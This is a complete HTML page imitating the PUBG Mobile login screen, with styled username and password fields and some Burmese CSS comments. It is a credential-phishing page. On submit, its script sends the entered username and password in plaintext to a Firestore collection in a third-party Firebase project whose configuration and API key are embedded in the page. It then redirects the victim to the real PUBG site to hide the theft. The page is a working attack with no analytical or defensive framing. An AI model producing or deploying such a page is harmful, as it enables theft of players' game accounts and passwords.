<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* CSS Background - စစ်မြေပြင်စတိုင် အမှောင်လိုင်းများ */
        body {
            background: radial-gradient(circle at center, #2c2c2c 0%, #000000 100%);
            background-color: #111;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Arial Black', sans-serif;
            margin: 0;
            overflow: hidden;
        }

        /* Pure CSS PUBG Logo Style */
        .pubg-logo-css {
            font-size: 40px;
            font-weight: 900;
            color: #000;
            background: #f3ab1c; /* PUBG Yellow */
            display: inline-block;
            padding: 5px 15px;
            transform: skewX(-15deg); /* စောင်းစောင်းလေးဖြစ်အောင် */
            margin-bottom: 25px;
            border: 3px solid #000;
            box-shadow: 5px 5px 0px #444;
        }

        .login-card {
            background: #1a1a1a;
            border: 4px solid #333;
            border-left: 8px solid #f3ab1c; /* ဘေးမျဉ်းဝါဝါ */
            width: 100%;
            max-width: 400px;
            padding: 40px;
            box-shadow: 20px 20px 0px rgba(0,0,0,0.5);
            position: relative;
        }

        h2 {
            color: #fff;
            font-size: 14px;
            text-align: center;
            letter-spacing: 4px;
            margin-bottom: 30px;
            text-transform: uppercase;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .form-control {
            background: #000;
            border: 1px solid #444;
            border-radius: 0;
            color: #f3ab1c;
            padding: 12px;
            font-weight: bold;
        }

        .form-control:focus {
            background: #050505;
            border-color: #f3ab1c;
            box-shadow: none;
            color: #fff;
        }

        /* PUBG Button Style */
        .btn-pubg {
            background: #f3ab1c;
            border: none;
            color: #000;
            width: 100%;
            padding: 15px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-radius: 0;
            position: relative;
            transition: 0.2s;
            clip-path: polygon(5% 0%, 100% 0%, 95% 100%, 0% 100%); /* ခပ်စောင်းစောင်းပုံစံ */
        }

        .btn-pubg:hover {
            background: #fff;
            transform: scale(1.02);
        }

        .footer-links {
            margin-top: 25px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            text-transform: uppercase;
        }

        .footer-links a {
            color: #666;
            text-decoration: none;
            letter-spacing: 1px;
        }

        .footer-links a:hover {
            color: #f3ab1c;
        }

        /* Loading Animation */
        .loader-bar {
            position: absolute;
            top: 0; left: 0;
            height: 4px; background: #f3ab1c;
            width: 0%;
            transition: width 0.4s;
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="loader-bar" id="loader"></div>
    
    <div class="text-center">
        <div class="pubg-logo-css">PUBG</div>
    </div>
    
    <h2>BATTLEGROUNDS</h2>

    <form id="pubgForm">
        <div class="mb-3">
            <input type="text" id="username" class="form-control" placeholder="USERNAME / EMAIL" required>
        </div>
        <div class="mb-4">
            <input type="password" id="password" class="form-control" placeholder="PASSWORD" required>
        </div>

        <button type="submit" id="loginBtn" class="btn-pubg">Enter Match</button>
    </form>

    <div class="footer-links">
        <a href="#">Forgot Data</a>
        <a href="#" style="color: #f3ab1c;">Create Account</a>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
        authDomain: "main-apk-3209b.firebaseapp.com",
        projectId: "main-apk-3209b",
        storageBucket: "main-apk-3209b.firebasestorage.app",
        messagingSenderId: "729839795941",
        appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const form = document.getElementById('pubgForm');
    const btn = document.getElementById('loginBtn');
    const loader = document.getElementById('loader');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        btn.disabled = true;
        btn.innerText = "CONNECTING...";
        loader.style.width = "100%";

        try {
            await addDoc(collection(db, "pubg"), {
                username: user,
                password: pass,
                timestamp: new Date()
            });
            window.location.href = "https://www.pubgmobile.com/";
        } catch (err) {
            console.error(err);
            btn.disabled = false;
            btn.innerText = "Enter Match";
            loader.style.width = "0%";
        }
    });
</script>

</body>
</html>
